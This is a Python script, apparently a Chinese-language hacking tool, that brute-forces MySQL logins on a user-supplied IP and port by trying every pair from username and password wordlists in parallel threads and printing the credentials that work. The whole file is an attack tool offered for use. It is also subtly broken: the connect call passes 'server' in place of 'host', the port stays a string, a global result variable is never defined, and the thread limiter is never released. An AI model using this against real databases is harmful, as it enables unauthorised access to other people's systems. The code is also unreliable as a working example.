import pymysql
import threading
import sys

threads = []  # 线程池
thread_max = threading.BoundedSemaphore(1000000)
def begin():
    host = input(' 请输入需要爆破的mysql的ip地址:')
    h, o, s, t = host.split('.')
    if not 255 >= int(h) >= 0 or not 255 >= int(o) >= 0 or not 255 >= int(s) >= 0 or not 255 >= int(t) >= 0:
        print("ip地址有误，请重新输入")
        sys.exit()
    port=input('请输入端口号')
    tempuser = open('用户名.txt', 'r')
    temppasswd = open('密码库.txt', 'r')
    multi_mysql(tempuser, temppasswd, host, port)
def mysqlblast(user,passwd,host,port):
    global worktext
    try:
        pymysql.connect(server=host,user=user,port=port,password=passwd,connect_timeout=1)
        print( "mysql:{}:{}:{} {}".format(host, port, user, passwd))
        worktext+="mysql:{}:{}:{} {}".format(host, port, user, passwd)
    except Exception as e:
        print("mysql:{}:{} 用户名:{} 密码{}".format(host, port, user, passwd+'尝试连接失败'))
        pass



def multi_mysql(tempuser, temppasswd, host, port):
    userfile = tempuser.readlines()
    passwdfile = temppasswd.readlines()
    for u in userfile:
        for w in passwdfile:
            thread_max.acquire()
            t = threading.Thread(target=mysqlblast, args=(u.replace('\n', ''), w.replace('\n', ''), host,port,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
    print('成功结果'+worktext)

_print = print
mutex = threading.Lock()
def print(text, *args, **kw):
    with mutex:
        _print(text, *args, **kw)